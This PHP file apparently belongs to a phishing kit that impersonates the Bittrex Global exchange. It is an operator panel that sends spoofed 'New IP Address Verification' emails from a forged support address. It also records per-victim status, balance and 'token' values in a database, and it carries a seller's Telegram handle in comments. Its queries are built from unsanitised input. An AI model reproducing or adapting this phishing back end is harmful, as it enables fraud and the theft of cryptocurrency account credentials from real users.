<script>
setTimeout(function(){
    location.href = 'index.php';
}, 1000);
</script>
<?php
session_start();
include_once '../db/dbmysqli.php';
include_once 'mail.php';

if(!$_SESSION['username']){
 header("Location: login.php");
 exit;
}

    $id= (int)$_POST['id'];

$comment= $_POST['comment'];

switch ($_REQUEST['action']) {

    case 'continue':
    $ip = (int)$_GET['ip'];
    $to= $_GET['email'];

    //$to = "uriychuprakov@gmail.com";
    $subject = "Bittrex Global New IP Address Verification";




    // Always set content-type when sending HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $fromer = "support@".$_SERVER['SERVER_NAME']."";

    // More headers
	// Telegram @fletchen
    //$headers .= 'From: <support@'."$_SERVER['SERVER_NAME']".'>' . "\r\n";
    //$headers .= 'Cc: support@'."$_SERVER['SERVER_NAME']"."\r\n";
    $headers .= 'From: <'.$fromer.'>' . "\r\n";
    $headers .= 'Cc: '.$fromer.'' . "\r\n";

    mail($to,$subject,$message,$headers);



    $sql = "UPDATE checker SET result='continue'  WHERE hash='$id'";

if ($conn->query($sql) === TRUE) {
    echo "Record updated successfully";
} else {
    echo "Error updating record: " . $conn->error;
}
break;

case 'stop':
$sql = "UPDATE checker SET result='stop'  WHERE hash='$id'";

if ($conn->query($sql) === TRUE) {
echo "Record updated successfully";
} else {
echo "Error updating record: " . $conn->error;
}
break;
case 'balance':
$sql = "UPDATE checker SET result='$comment'  WHERE id='$id'";

if ($conn->query($sql) === TRUE) {
echo "Record updated successfully";
} else {
echo "Error updating record: " . $conn->error;
}
break;
case 'comment':
$sql = "UPDATE checker SET token='$comment'  WHERE id='$id'";

if ($conn->query($sql) === TRUE) {
echo "Record updated successfully";
} else {
echo "Error updating record: " . $conn->error;
}// Telegram @fletchen
break;
case 'delete':
$sql = "DELETE FROM checker WHERE id='$id'";

if ($conn->query($sql) === TRUE) {
    echo "Record deleted successfully";
} else {
    echo "Error deleting record: " . $conn->error;
}

break;
}
    ?>
